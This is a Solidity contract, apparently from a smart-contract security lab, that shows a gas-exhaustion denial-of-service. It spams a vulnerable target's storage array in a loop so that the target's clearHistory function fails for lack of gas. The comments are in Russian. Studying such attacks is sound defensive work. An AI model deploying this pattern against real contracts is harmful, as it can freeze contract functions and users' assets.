// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableStorageDoS.sol";

contract DoSAttacker {
    VulnerableStorageDoS public target;

    constructor(address _target) {
        target = VulnerableStorageDoS(_target);
    }

    // создаёт огромный массив в target
    function performAttack(uint256 loops, uint256 batch) external {
        // запускаем спам в цикле чтобы array стал ОЧЕНЬ большим
        for (uint256 i = 0; i < loops; i++) {
            target.spamStorage(batch);
        }

        // попытка вызвать очистку — должна ОТКАЗАТЬ по газу
        target.clearHistory();
    }
}
